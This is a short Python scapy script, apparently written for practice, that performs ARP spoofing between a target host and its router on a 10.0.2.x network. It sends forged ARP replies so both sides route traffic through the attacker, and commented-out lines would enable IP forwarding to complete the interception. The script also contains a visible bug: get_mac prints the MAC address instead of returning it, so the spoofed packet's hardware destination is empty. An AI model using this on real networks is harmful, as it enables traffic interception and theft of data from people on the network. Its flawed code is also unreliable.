#!/usr/bin/env python3

#import subprocess
import scapy.all as scapy

# Enable/Disable port forwarding (Sudo)
#subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
#subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.summary())
    print(packet.show())
    scapy.send(packet)


router_ip = "10.0.2.1"
target_ip = "10.0.2.7"

get_mac(target_ip)
spoof(target_ip, router_ip) # Victim
spoof(router_ip, target_ip) # Router

